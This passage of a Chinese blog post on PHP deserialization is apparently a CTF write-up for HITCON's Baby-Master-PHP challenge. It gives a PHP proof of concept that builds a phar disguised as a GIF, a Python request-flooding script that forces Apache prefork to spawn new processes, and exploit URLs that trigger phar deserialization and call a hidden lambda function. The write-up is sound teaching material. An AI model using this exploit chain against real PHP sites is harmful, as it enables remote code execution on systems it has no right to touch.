<p>上来第一行就是一个姿势点orz<br><code>$FLAG = create_function(&quot;&quot;, &#39;die(</code>/read_flag<code>);&#39;);</code>。根据<a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/d56a534acc52b0bb7d61ac7c3386ab96e8ca4a97/Zend/zend_builtin_functions.c#L1914">php源码</a></p>
<p><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200341989.png" alt="image-20201113200341989"></p>
<p>匿名函数会被设置为<code>\x00lambda_%d</code> ，其中 <code>%d</code> 为数字，取决于进程中匿名函数的个数，但是我们每访问一次题目，就会生成一个匿名函数，这样匿名函数的名字就不可控。<br>这里需要参考: <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1392036">Apache 工作的三种模式：Prefork、Worker、Event</a><br>可以通过大量的请求来迫使Pre-fork模式启动的Apache启动新的线程，这样这里的<code>%d</code>会刷新为1，就可以预测了。</p>
<blockquote>
<p>Apache-prefork模型(默认模型)在接受请求后会如何处理,首先Apache会默认生成5个child server去等待用户连接, 默认最高可生成256个child server, 这时候如果用户大量请求, Apache就会在处理完MaxRequestsPerChild个tcp连接后kill掉这个进程,开启一个新进程处理请求。</p>
</blockquote>
<p>随后代码初始化了用户沙箱。</p>
<p>题目中干扰最大的是<code>check_session</code> 函数。<code>check_session</code> 函数中具有反序列化的功能，但是 <code>hash_equals</code> 函数进行了数据校验，而 <code>$SECRET</code> 的值不可知。因此无法利用这点进行反序列化构造我们的payload</p>
<p>然后代码有两个类User、Admin。其分别是父类与子类。admin类中存在敏感函数eval。然后是一个 <code>$_GET[&quot;lucky&quot;]();</code> 这样的动态调用。</p>
<p>后面主要实现了两个功能，一个是写入一个文件，一个是返回文件路径。<br>且对文件前几个字符进行了 <code>GIF89a</code> 的限制</p>
<p>之前是0day，现在已经有很多文章都分析过 phar 拓展反序列化的原理。</p>
<p>upload函数中 <code>file_get_contents</code> 这类文件相关操作会触发 phar，从而进行反序列化。</p>
<p>poc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$avatar</span> = <span class="string">&#x27;orz&#x27;</span>;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;file.php&#x27;</span>] = <span class="string">&#x27;&lt;?php ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetadata(<span class="keyword">new</span> Admin());</span><br><span class="line"><span class="variable">$p</span>-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line">rename(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.phar&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.gif&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接着，我们需要通过大量请求，使 apache 重新开启一个新的线程</p>
<p>贴上 @orange 师傅的脚本 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">&#x27;x.x.x.x&#x27;</span></span><br><span class="line">        PORT = xx</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="string">&#x27;GET /avatar.gif HTTP/1.1\nHost: yourip\nConnection: Keep-Alive\n\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, <span class="built_in">range</span>(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>

<p>加载我们服务器上的phar文件<br><a target="_blank" rel="noopener" href="http://117.50.3.97:8005/index.php?m=upload&amp;url=http://ip&#39;">http://117.50.3.97:8005/index.php?m=upload&amp;url=http://ip&#39;</a></p>
<p>利用脚本发出大量请求，使 apache 重新开启一个新的线程</p>
<p>最后访问<br><a target="_blank" rel="noopener" href="http://117.50.3.97:8005/index.php?m=upload&amp;url=phar:///var/www/data/xxx/&amp;lucky=%00lambda_1">http://117.50.3.97:8005/index.php?m=upload&amp;url=phar:///var/www/data/xxx/&amp;lucky=%00lambda_1</a></p>
<p><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200356402.png"></p>
<blockquote>
<p>refer<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2_1">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2_1</a><br><a target="_blank" rel="noopener" href="https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/">https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/</a><br><a target="_blank" rel="noopener" href="https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/">https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/</a><br><a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>
</blockquote>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%B1%9E%E6%80%A7"><span class="toc-number">1.</span> <span class="toc-text">三种类属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-7124"><span class="toc-number">3.</span> <span class="toc-text">CVE-2016-7124</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">4.</span> <span class="toc-text">POP链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE"><span class="toc-number">4.1.</span> <span class="toc-text">知识回顾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#demo1"><span class="toc-number">4.2.</span> <span class="toc-text">demo1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#demo2"><span class="toc-number">4.3.</span> <span class="toc-text">demo2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">原生类利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ZipArchive-open"><span class="toc-number">5.1.</span> <span class="toc-text">ZipArchive::open</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SoapClient"><span class="toc-number">5.2.</span> <span class="toc-text">SoapClient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Error-XSS"><span class="toc-number">5.3.</span> <span class="toc-text">Error XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exception-XSS"><span class="toc-number">5.4.</span> <span class="toc-text">Exception XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">5.5.</span> <span class="toc-text">多种姿势组合拳</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">6.</span> <span class="toc-text">反序列化字符逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E4%B8%80"><span class="toc-number">6.1.</span> <span class="toc-text">例子一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E4%BA%8C"><span class="toc-number">6.2.</span> <span class="toc-text">例子二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">7.</span> <span class="toc-text">Session 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E7%9B%B8%E5%85%B3"><span class="toc-number">7.1.</span> <span class="toc-text">参数相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%AE%E5%BC%82%E6%80%A7"><span class="toc-number">7.2.</span> <span class="toc-text">差异性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5"><span class="toc-number">7.3.</span> <span class="toc-text">攻击手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#trick-1"><span class="toc-number">7.3.1.</span> <span class="toc-text">trick-1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#trick-2"><span class="toc-number">7.3.2.</span> <span class="toc-text">trick-2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E4%B8%80-1"><span class="toc-number">7.4.</span> <span class="toc-text">例子一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E4%BA%8C-1"><span class="toc-number">7.5.</span> <span class="toc-text">例子二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phar%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">8.</span> <span class="toc-text">Phar拓展攻击面</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Phar%E7%AE%80%E4%BB%8B"><span class="toc-number">8.1.</span> <span class="toc-text">Phar简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6"><span class="toc-number">8.2.</span> <span class="toc-text">触发条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HITCON-%E9%80%92%E8%BF%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">9.</span> <span class="toc-text">HITCON  递进反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HITCON-2016-babytrick"><span class="toc-number">9.1.</span> <span class="toc-text">HITCON 2016 babytrick</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HITCON-2017-Baby-Master-PHP"><span class="toc-number">9.2.</span> <span class="toc-text">HITCON 2017 Baby-Master-PHP</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=再谈 PHP 反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=再谈 PHP 反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=再谈 PHP 反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=再谈 PHP 反序列化&body=Check out this article: http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=再谈 PHP 反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=再谈 PHP 反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=再谈 PHP 反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=再谈 PHP 反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=再谈 PHP 反序列化&description=&lt;p&gt;文章首发于 SECIN社区：&lt;a href=&#34;https://www.sec-in.com/article/137&#34;&gt;https://www.sec-in.com/article/137&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=再谈 PHP 反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2021 M13n
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
